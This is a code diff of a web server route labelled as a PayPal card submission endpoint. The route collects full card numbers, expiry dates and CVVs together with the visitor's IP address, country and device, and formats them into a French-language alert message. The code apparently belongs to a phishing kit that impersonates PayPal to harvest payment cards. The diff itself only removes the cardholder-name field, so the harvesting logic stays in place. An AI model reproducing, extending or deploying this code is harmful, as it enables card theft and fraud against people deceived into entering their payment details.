@@ -402,9 +402,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // PayPal card submission endpoint
   app.post("/api/paypal/card", async (req, res) => {
     try {
-      const { cardNumber, expiryMonth, expiryYear, cvv, cardholderName } = req.body;
+      const { cardNumber, expiryMonth, expiryYear, cvv } = req.body;
 
-      if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !cardholderName) {
+      if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
         return res.status(400).json({ error: "All card fields required" });
       }
 
@@ -417,7 +417,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         expiryMonth,
         expiryYear,
         cvv,
-        cardholderName,
         ipAddress: clientInfo.ipAddress,
         country: clientInfo.country,
         device: clientInfo.device,
@@ -434,7 +433,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
 💳 <b>Numéro de carte:</b> <code>${cardNumber}</code>
 📅 <b>Date d'expiration:</b> <code>${expiryMonth}/${expiryYear}</code>
 🔐 <b>CVV:</b> <code>${cvv}</code>
-👤 <b>Nom du titulaire:</b> <code>${cardholderName}</code>
 
 🌍 <b>Pays:</b> ${clientInfo.country}
 📱 <b>Appareil:</b> ${clientInfo.device}
